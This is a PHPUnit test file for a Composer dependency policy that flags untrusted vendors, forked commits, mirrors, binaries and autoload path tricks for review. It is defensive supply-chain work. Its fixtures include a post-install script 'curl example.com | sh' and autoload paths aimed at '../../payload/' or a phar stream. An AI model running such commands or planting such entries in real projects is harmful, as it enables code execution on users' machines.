<?php

declare(strict_types=1);

namespace Intakt\Tests\Plugin\PhpLanguage\Domain;

use Intakt\Plugin\Language\Contract\DependencyDecision;
use Intakt\Plugin\Language\Contract\DependencyFiles;
use Intakt\Plugin\Language\Contract\DependencyFinding;
use Intakt\Plugin\PhpLanguage\Domain\AutoloadRules;
use Intakt\Plugin\PhpLanguage\Domain\ComposerFileUnreadable;
use Intakt\Plugin\PhpLanguage\Domain\ComposerPolicy;
use Intakt\Plugin\PhpLanguage\Domain\ComposerState;
use Intakt\Plugin\PhpLanguage\Domain\GitHubCommit;
use Intakt\Plugin\PhpLanguage\Domain\LockedPackage;
use Intakt\Plugin\PhpLanguage\Domain\LockedPackageChanges;
use Intakt\Plugin\PhpLanguage\Domain\PackageGroup;
use Intakt\Plugin\PhpLanguage\Domain\RequirementChanges;
use Intakt\Plugin\PhpLanguage\Domain\SettingChanges;
use Intakt\Plugin\PhpLanguage\Domain\TrustedPackages;
use Intakt\Plugin\PhpLanguage\Domain\UpstreamTagNotRead;
use Intakt\Plugin\PhpLanguage\Infrastructure\ComposerPolicyConfiguration;
use Intakt\Tests\Plugin\PhpLanguage\ComposerFiles;
use Intakt\Tests\Plugin\PhpLanguage\LockedCommits;
use Intakt\Tests\Plugin\PhpLanguage\RecordedUpstreamTags;
use PHPUnit\Framework\Attributes\CoversClass;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\Attributes\UsesClass;
use PHPUnit\Framework\TestCase;

#[CoversClass(ComposerPolicy::class)]
#[CoversClass(AutoloadRules::class)]
#[CoversClass(ComposerState::class)]
#[CoversClass(LockedPackage::class)]
#[CoversClass(GitHubCommit::class)]
#[CoversClass(SettingChanges::class)]
#[CoversClass(RequirementChanges::class)]
#[CoversClass(LockedPackageChanges::class)]
#[CoversClass(TrustedPackages::class)]
#[CoversClass(ComposerFileUnreadable::class)]
#[CoversClass(PackageGroup::class)]
#[UsesClass(UpstreamTagNotRead::class)]
#[UsesClass(DependencyDecision::class)]
#[UsesClass(DependencyFiles::class)]
#[UsesClass(DependencyFinding::class)]
final class ComposerPolicyTest extends TestCase
{
    public function testNoComposerFilesOnEitherSideIsRoutine(): void
    {
        $decision = $this->decide(ComposerFiles::none(), ComposerFiles::none());

        self::assertFalse($decision->needsOwner());
    }

    public function testANewSymfonyPackageFromItsOwnRepositoryAtItsUpstreamTagIsRoutine(): void
    {
        $after = ComposerFiles::sample()->requiring('symfony/uid', '^8.0')->locking(ComposerFiles::entry('symfony/uid', 'v8.0.0', LockedCommits::UID_8_0_0));

        $decision = $this->decide(ComposerFiles::sample(), $after);

        self::assertSame([], $this->findingsOf($decision));
        self::assertSame(['symfony/uid'], $decision->newPackages);
    }

    public function testANewDoctrinePackageFromAnotherRepositoryOfItsVendorIsRoutine(): void
    {
        $after = ComposerFiles::sample()->requiring('doctrine/doctrine-bundle', '^3.0')
            ->locking([...ComposerFiles::inRepository(ComposerFiles::entry('doctrine/doctrine-bundle', '3.0.0', LockedCommits::OTHER), 'doctrine/DoctrineBundle'), 'type' => 'symfony-bundle']);

        self::assertSame([], $this->findingsOf($this->decide(ComposerFiles::sample(), $after)));
    }

    public function testANewSymfonyAiPlatformAtABetaTagWithItsBetaFlagIsRoutine(): void
    {
        $after = ComposerFiles::sample()->requiring('symfony/ai-anthropic-platform', '^1.0@beta')
            ->locking([...ComposerFiles::entry('symfony/ai-anthropic-platform', 'v1.0.0-BETA1', LockedCommits::OTHER), 'type' => 'symfony-ai-platform'])
            ->withLockKey('stability-flags', ['symfony/ai-anthropic-platform' => 10]);

        self::assertSame([], $this->findingsOf($this->decide(ComposerFiles::sample(), $after)));
    }

    public function testAnRcFlagForAPackageTheChangeAddsIsRoutine(): void
    {
        $after = ComposerFiles::sample()->requiring('symfony/uid', '^8.0@RC')
            ->locking(ComposerFiles::entry('symfony/uid', 'v8.0.0', LockedCommits::UID_8_0_0))
            ->withLockKey('stability-flags', ['symfony/uid' => 5]);

        self::assertSame([], $this->findingsOf($this->decide(ComposerFiles::sample(), $after)));
    }

    public function testAPackageFromAnotherVendorNeedsTheOwnerAndIsNamed(): void
    {
        $after = ComposerFiles::sample()->requiring('acme/tool', '^1.0')->locking(ComposerFiles::entry('acme/tool', '1.0.0', LockedCommits::OTHER));

        $decision = $this->decide(ComposerFiles::sample(), $after);

        self::assertSame(['acme/tool: is not from a trusted vendor'], $this->findingsOf($decision));
        self::assertSame(['acme/tool'], $decision->newPackages);
    }

    public function testAPackageFromAnotherVendorIsNeverLookedUpUpstream(): void
    {
        $tags = LockedCommits::upstream();
        $after = ComposerFiles::sample()->requiring('acme/tool', '^1.0')->locking(ComposerFiles::entry('acme/tool', '1.0.0', LockedCommits::OTHER));

        $this->decide(ComposerFiles::sample(), $after, $tags);

        self::assertSame([], $tags->asked);
    }

    public function testAVendorThatOnlyStartsLikeATrustedOneIsNotTrusted(): void
    {
        $after = ComposerFiles::sample()->requiring('symfonyx/console', '^1.0')->locking(ComposerFiles::entry('symfonyx/console', '1.0.0', LockedCommits::OTHER));

        self::assertSame(['symfonyx/console: is not from a trusted vendor'], $this->findingsOf($this->decide(ComposerFiles::sample(), $after)));
    }

    public function testATransitivePackageFromAnotherVendorNeedsTheOwnerAndIsNamed(): void
    {
        $after = ComposerFiles::sample()->requiring('symfony/uid', '^8.0')
            ->locking(ComposerFiles::entry('symfony/uid', 'v8.0.0', LockedCommits::UID_8_0_0))
            ->locking(ComposerFiles::entry('acme/tool', '1.0.0', LockedCommits::OTHER));

        $decision = $this->decide(ComposerFiles::sample(), $after);

        self::assertSame(['acme/tool: is not from a trusted vendor'], $this->findingsOf($decision));
        self::assertSame(['acme/tool', 'symfony/uid'], $decision->newPackages);
    }

    public function testANewPlatformRequirementNeedsTheOwner(): void
    {
        $after = ComposerFiles::sample()->requiring('ext-sodium', '*');

        self::assertSame(['ext-sodium: is not from a trusted vendor'], $this->findingsOf($this->decide(ComposerFiles::sample(), $after)));
    }

    public function testANewPackageAtACommitThatIsNotTheUpstreamTagNeedsTheOwner(): void
    {
        $after = ComposerFiles::sample()->requiring('symfony/uid', '^8.0')->locking(ComposerFiles::entry('symfony/uid', 'v8.0.0', LockedCommits::FORK));

        self::assertSame(
            ['symfony/uid: commit '.LockedCommits::FORK.' is not the upstream tag v8.0.0'],
            $this->findingsOf($this->decide(ComposerFiles::sample(), $after)),
        );
    }

    public function testANewPackageWhoseTagUpstreamDoesNotExistNeedsTheOwner(): void
    {
        $after = ComposerFiles::sample()->requiring('symfony/uid', '^8.0')->locking(ComposerFiles::entry('symfony/uid', 'v8.0.9', LockedCommits::UID_8_0_0));

        self::assertSame(
            ['symfony/uid: commit '.LockedCommits::UID_8_0_0.' is not the upstream tag v8.0.9'],
            $this->findingsOf($this->decide(ComposerFiles::sample(), $after)),
        );
    }

    public function testANewPackageLockedAtABranchNeedsTheOwnerWithoutALookup(): void
    {
        $tags = LockedCommits::upstream();
        $after = ComposerFiles::sample()->requiring('symfony/uid', 'dev-main')->locking(ComposerFiles::entry('symfony/uid', 'dev-main', LockedCommits::UID_8_0_0));

        $decision = $this->decide(ComposerFiles::sample(), $after, $tags);

        self::assertSame(['symfony/uid: is locked at dev-main, which is no release tag'], $this->findingsOf($decision));
        self::assertSame([], $tags->asked);
    }

    public function testANewPackageLockedAtADevelopmentVersionNeedsTheOwnerWithoutALookup(): void
    {
        $tags = LockedCommits::upstream();
        $after = ComposerFiles::sample()->requiring('symfony/uid', '8.0.x-dev')->locking(ComposerFiles::entry('symfony/uid', '8.0.x-dev', LockedCommits::UID_8_0_0));

        $decision = $this->decide(ComposerFiles::sample(), $after, $tags);

        self::assertSame(['symfony/uid: is locked at 8.0.x-dev, which is no release tag'], $this->findingsOf($decision));
        self::assertSame([], $tags->asked);
    }

    public function testANewPackageWithANullTargetDirectoryIsRoutine(): void
    {
        $after = ComposerFiles::sample()->requiring('symfony/uid', '^8.0')->locking([...ComposerFiles::entry('symfony/uid', 'v8.0.0', LockedCommits::UID_8_0_0), 'target-dir' => null]);

        self::assertSame([], $this->findingsOf($this->decide(ComposerFiles::sample(), $after)));
    }

    public function testAnUpstreamThatCannotBeReadSendsTheChangeToTheOwner(): void
    {
        $after = ComposerFiles::sample()->requiring('symfony/uid', '^8.0')->locking(ComposerFiles::entry('symfony/uid', 'v8.0.0', LockedCommits::UID_8_0_0));

        self::assertSame(
            ['symfony/uid: the upstream tag could not be read: git failed 3 times: could not resolve host'],
            $this->findingsOf($this->decide(ComposerFiles::sample(), $after, new RecordedUpstreamTags(unreachable: true))),
        );
    }

    public function testANewPackageFromAnotherOrganizationsRepositoryNeedsTheOwner(): void
    {
        $after = ComposerFiles::sample()->requiring('symfony/uid', '^8.0')->locking(ComposerFiles::inRepository(ComposerFiles::entry('symfony/uid', 'v8.0.0', LockedCommits::UID_8_0_0), 'someone/uid'));

        self::assertSame(
            ['symfony/uid: does not come from its own vendor\'s repository at one commit'],
            $this->findingsOf($this->decide(ComposerFiles::sample(), $after)),
        );
    }

    /**
     * @return iterable<string, array{array<string, mixed>}>
     */
    public static function placesThatDisagree(): iterable
    {
        $entry = ComposerFiles::entry('symfony/uid', 'v8.0.0', LockedCommits::UID_8_0_0);

        yield 'an archive from another host' => [[...$entry, 'dist' => ['type' => 'zip', 'url' => 'https://example.com/uid.zip', 'reference' => LockedCommits::UID_8_0_0]]];
        yield 'an archive of another commit' => [[...$entry, 'dist' => ['type' => 'zip', 'url' => 'https://api.github.com/repos/symfony/uid/zipball/'.LockedCommits::FORK, 'reference' => LockedCommits::FORK]]];
        yield 'a source in another form' => [[...$entry, 'source' => ['type' => 'hg', 'url' => 'https://github.com/symfony/uid.git', 'reference' => LockedCommits::UID_8_0_0]]];
        yield 'neither a source nor an archive' => [array_diff_key($entry, ['source' => true, 'dist' => true])];
        yield 'a source and no archive from another organization' => [[...array_diff_key($entry, ['dist' => true]), 'source' => ['type' => 'git', 'url' => 'https://github.com/someone/uid.git', 'reference' => LockedCommits::UID_8_0_0]]];
    }

    /**
     * @param array<string, mixed> $entry
     */
    #[DataProvider('placesThatDisagree')]
    public function testANewPackageWhoseSourceAndArchiveDoNotNameOneGitHubCommitNeedsTheOwner(array $entry): void
    {
        $after = ComposerFiles::sample()->requiring('symfony/uid', '^8.0')->locking($entry);

        self::assertSame(
            ['symfony/uid: does not come from its own vendor\'s repository at one commit'],
            $this->findingsOf($this->decide(ComposerFiles::sample(), $after)),
        );
    }

    public function testANewPackageWithOnlyAnArchiveOfItsOwnRepositoryIsRoutine(): void
    {
        $after = ComposerFiles::sample()->requiring('symfony/uid', '^8.0')
            ->locking(array_diff_key(ComposerFiles::entry('symfony/uid', 'v8.0.0', LockedCommits::UID_8_0_0), ['source' => true]));

        self::assertSame([], $this->findingsOf($this->decide(ComposerFiles::sample(), $after)));
    }

    /**
     * @return iterable<string, array{array<string, mixed>, string}>
     */
    public static function effects(): iterable
    {
        yield 'binaries' => [['bin' => ['bin/uid']], 'ships binaries'];
        yield 'a single binary' => [['bin' => 'bin/uid'], 'ships binaries'];
        yield 'autoload files' => [['autoload' => ['files' => ['bootstrap.php']]], 'has autoload files'];
        yield 'an autoload classmap' => [['autoload' => ['classmap' => ['../../src/']]], 'has an autoload classmap'];
        yield 'another vendor\'s namespace' => [['autoload' => ['psr-4' => ['Intakt\\' => 'src/']]], 'maps autoload outside its own namespace or folder'];
        yield 'the fallback namespace' => [['autoload' => ['psr-4' => ['' => 'src/']]], 'maps autoload outside its own namespace or folder'];
        yield 'a folder above the package' => [['autoload' => ['psr-4' => ['Symfony\\' => '../../payload/']]], 'maps autoload outside its own namespace or folder'];
        yield 'a folder above the package in a list' => [['autoload' => ['psr-4' => ['Symfony\\' => ['src/', 'src\\..\\..\\..\\payload']]]], 'maps autoload outside its own namespace or folder'];
        yield 'an absolute folder' => [['autoload' => ['psr-4' => ['Symfony\\' => '/srv/payload/']]], 'maps autoload outside its own namespace or folder'];
        yield 'a stream wrapper' => [['autoload' => ['psr-0' => ['Symfony\\' => 'phar://payload.phar/']]], 'maps autoload outside its own namespace or folder'];
        yield 'another vendor\'s namespace in PSR-0' => [['autoload' => ['psr-0' => ['Intakt_' => 'src/']]], 'maps autoload outside its own namespace or folder'];
        yield 'autoload that is no map' => [['autoload' => 'bootstrap.php'], 'its autoload cannot be checked'];
        yield 'an autoload key Composer may add later' => [['autoload' => ['psr-5' => ['Symfony\\' => 'src/']]], 'its autoload cannot be checked'];
        yield 'a Composer plugin' => [['type' => 'composer-plugin'], 'is a Composer plugin'];
        yield 'a type not allowed' => [['type' => 'symfony-pack'], 'has the package type "symfony-pack", which is not allowed'];
        yield 'an include path' => [['include-path' => ['../../../payload']], 'sets an include path'];
        yield 'a single include path' => [['include-path' => '../../'], 'sets an include path'];
        yield 'a target directory' => [['target-dir' => '../../x'], 'sets a target directory'];
        yield 'a key the policy does not judge' => [['scripts' => ['post-install-cmd' => 'acme-setup']], 'has the key "scripts", which the policy does not judge'];
        yield 'a notification address besides Packagist' => [['notification-url' => 'https://example.com/downloads/'], 'has the key "notification-url", which the policy does not judge'];
    }

    public function testANewPackageWithMetadataAnAliasAndAnEmptyIncludePathIsRoutine(): void
    {
        $after = ComposerFiles::sample()->requiring('symfony/uid', '^8.0')->locking([
            ...ComposerFiles::entry('symfony/uid', 'v8.0.0', LockedCommits::UID_8_0_0),
            'extra' => ['branch-alias' => ['dev-main' => '8.0-dev'], 'thanks' => ['name' => 'symfony/symfony']],
            'include-path' => [],
            'require' => ['php' => '>=8.5'],
            'description' => 'Provides an object-oriented API to generate and represent UIDs',
            'time' => '2026-01-01T00:00:00+00:00',
            'published-time' => '2026-01-01T00:00:00+00:00',
            'archive' => ['exclude' => ['/Tests']],
            'funding' => [['url' => 'https://symfony.com/sponsor', 'type' => 'custom']],
        ]);

        self::assertSame([], $this->findingsOf($this->decide(ComposerFiles::sample(), $after)));
    }

    /**
     * @param array<string, mixed> $effect
     */
    #[DataProvider('effects')]
    public function testANewTrustedPackageThatRunsCodeOnInstallOrLoadNeedsTheOwner(array $effect, string $reason): void
    {
        $after = ComposerFiles::sample()->requiring('symfony/uid', '^8.0')->locking([...ComposerFiles::entry('symfony/uid', 'v8.0.0', LockedCommits::UID_8_0_0), ...$effect]);

        self::assertSame(['symfony/uid: '.$reason], $this->findingsOf($this->decide(ComposerFiles::sample(), $after)));
    }

    public function testANewPackageMappingItsOwnNamespaceToItsOwnFoldersIsRoutine(): void
    {
        $after = ComposerFiles::sample()->requiring('symfony/uid', '^8.0')->locking([
            ...ComposerFiles::entry('symfony/uid', 'v8.0.0', LockedCommits::UID_8_0_0),
            'autoload' => ['psr-4' => ['Symfony\\Component\\Uid\\' => ['', 'src/..dir']], 'psr-0' => ['Symfony\\Legacy\\' => 'lib/'], 'exclude-from-classmap' => ['/Tests/'], 'classmap' => [], 'files' => []],
        ]);

        self::assertSame([], $this->findingsOf($this->decide(ComposerFiles::sample(), $after)));
    }

    /**
     * @return iterable<string, array{array<string, mixed>}>
     */
    public static function placesWithMirrors(): iterable
    {
        $entry = ComposerFiles::entry('symfony/uid', 'v8.0.0', LockedCommits::UID_8_0_0);
        $mirrors = [['url' => 'https://example.com/%package%/%reference%.%type%', 'preferred' => true]];
        $source = is_array($entry['source']) ? $entry['source'] : [];
        $dist = is_array($entry['dist']) ? $entry['dist'] : [];

        yield 'archive mirrors' => [[...$entry, 'dist' => [...$dist, 'mirrors' => $mirrors]]];
        yield 'source mirrors' => [[...$entry, 'source' => [...$source, 'mirrors' => $mirrors]]];
        yield 'transport options' => [[...$entry, 'transport-options' => ['http' => ['proxy' => 'tcp://example.com:8080']]]];
    }

    /**
     * @param array<string, mixed> $entry
     */
    #[DataProvider('placesWithMirrors')]
    public function testANewPackageThatNamesAnotherPlaceToDownloadFromNeedsTheOwner(array $entry): void
    {
        $after = ComposerFiles::sample()->requiring('symfony/uid', '^8.0')->locking($entry);

        self::assertSame(
            ['symfony/uid: does not come from its own vendor\'s repository at one commit'],
            $this->findingsOf($this->decide(ComposerFiles::sample(), $after)),
        );
    }

    public function testAnExistingPackageThatGainsAPreferredMirrorNeedsTheOwner(): void
    {
        $entry = ComposerFiles::entry('symfony/console', 'v8.0.0', LockedCommits::CONSOLE_8_0_0);
        $dist = is_array($entry['dist']) ? $entry['dist'] : [];
        $after = ComposerFiles::sample()->locking([...$entry, 'dist' => [...$dist, 'mirrors' => [['url' => 'https://example.com/%package%.%type%', 'preferred' => true]]]]);

        self::assertSame(['symfony/console: its repository changed or cannot be checked'], $this->findingsOf($this->decide(ComposerFiles::sample(), $after)));
    }

    public function testAnotherDownloadAddressForAPackageThatCannotBeCheckedNeedsTheOwner(): void
    {
        $entry = ['name' => 'acme/tool', 'version' => '1.0.0', 'type' => 'library', 'dist' => ['type' => 'zip', 'url' => 'https://example.com/old.zip']];
        $before = ComposerFiles::sample()->locking($entry);
        $after = ComposerFiles::sample()->locking([...$entry, 'dist' => ['type' => 'zip', 'url' => 'https://example.com/replacement.zip']]);

        self::assertSame(['acme/tool: its repository changed or cannot be checked'], $this->findingsOf($this->decide($before, $after)));
    }

    public function testAnUnchangedPackageThatCannotBeCheckedStaysRoutine(): void
    {
        $before = ComposerFiles::sample()->locking(['name' => 'acme/tool', 'version' => '1.0.0', 'type' => 'library', 'dist' => ['type' => 'zip', 'url' => 'https://example.com/tool.zip']]);

        self::assertSame([], $this->findingsOf($this->decide($before, $before->withLockKey('content-hash', 'ddd'))));
    }

    public function testANewTrustedRequirementWithoutALockEntryNeedsTheOwner(): void
    {
        $after = ComposerFiles::sample()->requiring('symfony/uid', '^8.0');

        self::assertSame(['symfony/uid: is not locked in composer.lock'], $this->findingsOf($this->decide(ComposerFiles::sample(), $after)));
    }

    public function testANewTrustedRequirementLockedForDevelopmentIsRoutine(): void
    {
        $after = ComposerFiles::sample()->requiringForDevelopment('symfony/uid', '^8.0')->lockingForDevelopment(ComposerFiles::entry('symfony/uid', 'v8.0.0', LockedCommits::UID_8_0_0));

        self::assertSame([], $this->findingsOf($this->decide(ComposerFiles::sample(), $after)));
    }

    public function testAComposerPluginNeedsTheOwnerEvenWhenTheOwnerAllowsItsType(): void
    {
        $policy = new ComposerPolicy(new TrustedPackages(['symfony'], ['library', 'composer-plugin']), LockedCommits::upstream());
        $after = ComposerFiles::sample()->requiring('symfony/uid', '^8.0')->locking([...ComposerFiles::entry('symfony/uid', 'v8.0.0', LockedCommits::UID_8_0_0), 'type' => 'composer-plugin']);

        $decision = $policy->decide(ComposerFiles::sample()->files(), $after->files());

        self::assertSame(['symfony/uid: is a Composer plugin'], $this->findingsOf($decision));
    }

    public function testTheOwnersVendorsReplaceTheDefaults(): void
    {
        $policy = new ComposerPolicy(new TrustedPackages(['acme'], ['library']), LockedCommits::upstream());
        $after = ComposerFiles::sample()->requiring('acme/tool', '^1.0')->locking(ComposerFiles::entry('acme/tool', '1.0.0', LockedCommits::OTHER));

        self::assertSame([], $this->findingsOf($policy->decide(ComposerFiles::sample()->files(), $after->files())));
    }

    public function testAConstraintUpdateAtTheUpstreamTagIsRoutine(): void
    {
        $after = ComposerFiles::sample()->requiring('symfony/console', '^8.1')->locking(ComposerFiles::entry('symfony/console', 'v8.1.0', LockedCommits::CONSOLE_8_1_0))->withLockKey('content-hash', 'bbb');

        $decision = $this->decide(ComposerFiles::sample(), $after);

        self::assertSame([], $this->findingsOf($decision));
        self::assertSame([], $decision->newPackages);
    }

    public function testAnUpdateToACommitThatIsNotTheUpstreamTagNeedsTheOwner(): void
    {
        $after = ComposerFiles::sample()->locking(ComposerFiles::entry('symfony/console', 'v8.1.0', LockedCommits::FORK));

        self::assertSame(
            ['symfony/console: commit '.LockedCommits::FORK.' is not the upstream tag v8.1.0'],
            $this->findingsOf($this->decide(ComposerFiles::sample(), $after)),
        );
    }

    public function testAnUpdateOfAnotherVendorsPackageAtItsUpstreamTagIsRoutine(): void
    {
        $before = ComposerFiles::sample()->requiring('acme/tool', '^0.9')->locking(ComposerFiles::entry('acme/tool', '0.9.0', LockedCommits::FORK));
        $after = $before->requiring('acme/tool', '^1.0')->locking(ComposerFiles::entry('acme/tool', '1.0.0', LockedCommits::OTHER));

        self::assertSame([], $this->findingsOf($this->decide($before, $after)));
    }

    public function testAnUpdateFromAnotherRepositoryNeedsTheOwner(): void
    {
        $after = ComposerFiles::sample()->locking(ComposerFiles::inRepository(ComposerFiles::entry('symfony/console', 'v8.0.0', LockedCommits::CONSOLE_8_0_0), 'someone/console'));

        self::assertSame(['symfony/console: its repository changed or cannot be checked'], $this->findingsOf($this->decide(ComposerFiles::sample(), $after)));
    }

    public function testAnUpdateThatStartsShippingBinariesNeedsTheOwner(): void
    {
        $after = ComposerFiles::sample()->locking([...ComposerFiles::entry('symfony/console', 'v8.1.0', LockedCommits::CONSOLE_8_1_0), 'bin' => ['bin/console']]);

        self::assertSame(['symfony/console: its bin changed'], $this->findingsOf($this->decide(ComposerFiles::sample(), $after)));
    }

    public function testAnUpdateThatChangesItsNamespaceMappingNeedsTheOwner(): void
    {
        $after = ComposerFiles::sample()->locking([...ComposerFiles::entry('symfony/console', 'v8.0.0', LockedCommits::CONSOLE_8_0_0), 'autoload' => ['psr-4' => ['Intakt\\' => '../../payload/']]]);

        self::assertSame(['symfony/console: its autoload changed'], $this->findingsOf($this->decide(ComposerFiles::sample(), $after)));
    }

    /**
     * @return iterable<string, array{array<string, mixed>, string}>
     */
    public static function changedEffects(): iterable
    {
        yield 'an include path' => [['include-path' => ['../../../payload']], 'include-path'];
        yield 'a target directory' => [['target-dir' => '../../x'], 'target-dir'];
        yield 'another type' => [['type' => 'symfony-bundle'], 'type'];
        yield 'extra read by a plugin' => [['extra' => ['phpstan' => ['includes' => ['extension.neon']]]], 'extra'];
        yield 'a key the policy does not judge' => [['scripts' => ['post-install-cmd' => 'acme-setup']], 'scripts'];
        yield 'several keys at once' => [['target-dir' => 'x', 'include-path' => ['lib']], 'include-path, target-dir'];
        yield 'another notification address' => [['notification-url' => 'https://example.com/downloads/'], 'notification-url'];
    }

    /**
     * @param array<string, mixed> $effect
     */
    #[DataProvider('changedEffects')]
    public function testAnExistingPackageWhoseEntryGainsAKeyBesidesItsReleaseDataNeedsTheOwner(array $effect, string $keys): void
    {
        $after = ComposerFiles::sample()->locking([...ComposerFiles::entry('symfony/console', 'v8.0.0', LockedCommits::CONSOLE_8_0_0), ...$effect]);

        self::assertSame(['symfony/console: its '.$keys.' changed'], $this->findingsOf($this->decide(ComposerFiles::sample(), $after)));
    }

    public function testAnUpdateThatGainsAnIncludePathNeedsTheOwnerBesideItsTagCheck(): void
    {
        $after = ComposerFiles::sample()->locking([...ComposerFiles::entry('symfony/console', 'v8.1.0', LockedCommits::FORK), 'include-path' => ['../../../payload']]);

        self::assertSame(
            ['symfony/console: its include-path changed', 'symfony/console: commit '.LockedCommits::FORK.' is not the upstream tag v8.1.0'],
            $this->findingsOf($this->decide(ComposerFiles::sample(), $after)),
        );
    }

    public function testAnUpdateThatRewritesOnlyWhatAReleaseRewritesIsRoutine(): void
    {
        $before = ComposerFiles::sample()->locking([
            ...ComposerFiles::entry('symfony/console', 'v8.0.0', LockedCommits::CONSOLE_8_0_0),
            'extra' => ['branch-alias' => ['dev-main' => '8.0-dev']],
            'require' => ['php' => '>=8.5'],
            'time' => '2026-01-01T00:00:00+00:00',
            'description' => 'Eases the creation of beautiful and testable command line interfaces',
        ]);
        $after = ComposerFiles::sample()->locking([
            ...ComposerFiles::entry('symfony/console', 'v8.1.0', LockedCommits::CONSOLE_8_1_0),
            'extra' => ['branch-alias' => ['dev-main' => '8.1-dev']],
            'require' => ['php' => '>=8.5', 'symfony/string' => '^8.1'],
            'require-dev' => ['symfony/uid' => '^8.1'],
            'conflict' => ['symfony/uid' => '<8.1'],
            'time' => '2026-02-01T00:00:00+00:00',
            'published-time' => '2026-02-01T00:00:00+00:00',
            'description' => 'Eases the creation of command line interfaces',
            'suggest' => ['symfony/uid' => ''],
            'abandoned' => false,
        ]);

        self::assertSame([], $this->findingsOf($this->decide($before, $after)));
    }

    public function testAnUpdateThatDropsItsBranchAliasWithItsExtraIsRoutine(): void
    {
        $before = ComposerFiles::sample()->locking([...ComposerFiles::entry('symfony/console', 'v8.0.0', LockedCommits::CONSOLE_8_0_0), 'extra' => ['branch-alias' => ['dev-main' => '8.0-dev']]]);
        $after = ComposerFiles::sample()->locking(ComposerFiles::entry('symfony/console', 'v8.1.0', LockedCommits::CONSOLE_8_1_0));

        self::assertSame([], $this->findingsOf($this->decide($before, $after)));
    }

    public function testATrustedPackageMovedUnchangedToTheDevelopmentRequirementsIsRoutine(): void
    {
        $after = ComposerFiles::sample()->requiringForDevelopment('symfony/console', '^8.0')->lockingForDevelopment(ComposerFiles::entry('symfony/console', 'v8.0.0', LockedCommits::CONSOLE_8_0_0));

        self::assertSame([], $this->findingsOf($this->decide(ComposerFiles::sample(), $after)));
    }

    public function testATrustedPackageMovedWithAnotherConstraintNeedsTheOwner(): void
    {
        $after = ComposerFiles::sample()->requiringForDevelopment('symfony/console', '^8.1')->lockingForDevelopment(ComposerFiles::entry('symfony/console', 'v8.1.0', LockedCommits::CONSOLE_8_1_0));

        self::assertSame(['symfony/console: moved from require to require-dev'], $this->findingsOf($this->decide(ComposerFiles::sample(), $after)));
    }

    public function testAPackageFromAnotherVendorMovedUnchangedNeedsTheOwner(): void
    {
        $before = ComposerFiles::sample()->requiringForDevelopment('acme/tool', '^1.0')->lockingForDevelopment(ComposerFiles::entry('acme/tool', '1.0.0', LockedCommits::OTHER));
        $after = $before->requiring('acme/tool', '^1.0')->locking(ComposerFiles::entry('acme/tool', '1.0.0', LockedCommits::OTHER));

        self::assertSame(
            ['acme/tool: moved from require-dev to require', 'acme/tool: moved between the main and the development packages'],
            $this->findingsOf($this->decide($before, $after)),
        );
    }

    public function testARemovedPackageNeedsTheOwner(): void
    {
        $after = ComposerFiles::sample()->withoutRequirement('symfony/console')->withLockKey('packages', []);

        self::assertSame(
            ['symfony/console: was removed from composer.json', 'symfony/console: was removed from composer.lock'],
            $this->findingsOf($this->decide(ComposerFiles::sample(), $after)),
        );
    }

    public function testADevelopmentFlagForAPackageTheChangeAddsNeedsTheOwner(): void
    {
        $after = ComposerFiles::sample()->requiring('symfony/uid', '^8.0@dev')
            ->locking(ComposerFiles::entry('symfony/uid', 'v8.0.0', LockedCommits::UID_8_0_0))
            ->withLockKey('stability-flags', ['symfony/uid' => 20]);

        self::assertSame(
            ['symfony/uid: has the stability flag @dev', 'symfony/uid: its stability flag in composer.lock changed'],
            $this->findingsOf($this->decide(ComposerFiles::sample(), $after)),
        );
    }

    public function testABetaFlagForAPackageAlreadyRequiredNeedsTheOwner(): void
    {
        $after = ComposerFiles::sample()->requiring('symfony/console', '^8.0@beta')->withLockKey('stability-flags', ['symfony/console' => 10]);

        self::assertSame(
            ['symfony/console: has the stability flag @beta', 'symfony/console: its stability flag in composer.lock changed'],
            $this->findingsOf($this->decide(ComposerFiles::sample(), $after)),
        );
    }

    public function testAFlagThePackageAlreadyHadStaysRoutine(): void
    {
        $before = ComposerFiles::sample()->requiring('symfony/console', '^8.0@beta')->withLockKey('stability-flags', ['symfony/console' => 10]);
        $after = $before->requiring('symfony/console', '^8.0.1@beta');

        self::assertSame([], $this->findingsOf($this->decide($before, $after)));
    }

    /**
     * @return iterable<string, array{string, mixed}>
     */
    public static function manifestSettings(): iterable
    {
        yield 'scripts' => ['scripts', ['post-install-cmd' => ['curl example.com | sh']]];
        yield 'plugins allowed' => ['config', ['sort-packages' => true, 'allow-plugins' => ['acme/plugin' => true]]];
        yield 'repositories' => ['repositories', [['type' => 'vcs', 'url' => 'https://example.com/fork.git']]];
        yield 'minimum stability' => ['minimum-stability', 'dev'];
        yield 'autoload files' => ['autoload', ['files' => ['boot.php']]];
    }

    #[DataProvider('manifestSettings')]
    public function testAChangeToComposersOwnSettingsNeedsTheOwner(string $key, mixed $value): void
    {
        $after = ComposerFiles::sample()->withManifestKey($key, $value);

        self::assertSame(['composer.json '.$key.': one of Composer\'s own settings changed'], $this->findingsOf($this->decide(ComposerFiles::sample(), $after)));
    }

    /**
     * @return iterable<string, array{string, mixed}>
     */
    public static function lockSettings(): iterable
    {
        yield 'minimum stability' => ['minimum-stability', 'dev'];
        yield 'prefer stable' => ['prefer-stable', false];
        yield 'platform overrides' => ['platform-overrides', ['php' => '8.5.0']];
        yield 'aliases' => ['aliases', [['package' => 'symfony/console', 'version' => '9.0.0.0', 'alias' => '9.0', 'alias_normalized' => '9.0.0.0']]];
    }

    #[DataProvider('lockSettings')]
    public function testAChangeToTheLockFilesSettingsNeedsTheOwner(string $key, mixed $value): void
    {
        $after = ComposerFiles::sample()->withLockKey($key, $value);

        self::assertSame(['composer.lock '.$key.': one of Composer\'s own settings changed'], $this->findingsOf($this->decide(ComposerFiles::sample(), $after)));
    }

    public function testWhatComposerRewritesOnEveryUpdateIsRoutine(): void
    {
        $after = ComposerFiles::sample()->withLockKey('content-hash', 'ccc')->withLockKey('plugin-api-version', '2.11.0')->withLockKey('_readme', ['other']);

        self::assertSame([], $this->findingsOf($this->decide(ComposerFiles::sample(), $after)));
    }

    /**
     * @return iterable<string, array{string, string}>
     */
    public static function unreadableLocks(): iterable
    {
        yield 'no JSON' => ['{"packages": [', 'composer.lock cannot be read: Syntax error'];
        yield 'no object' => ['"packages"', 'composer.lock cannot be read: it holds no JSON object'];
        yield 'a list' => ['[1]', 'composer.lock cannot be read: it holds no JSON object'];
        yield 'an empty list' => ['[]', 'composer.lock cannot be read: it holds no JSON object'];
        yield 'packages that are no list' => ['{"packages": {"a": {}}}', 'composer.lock cannot be read: packages is no list'];
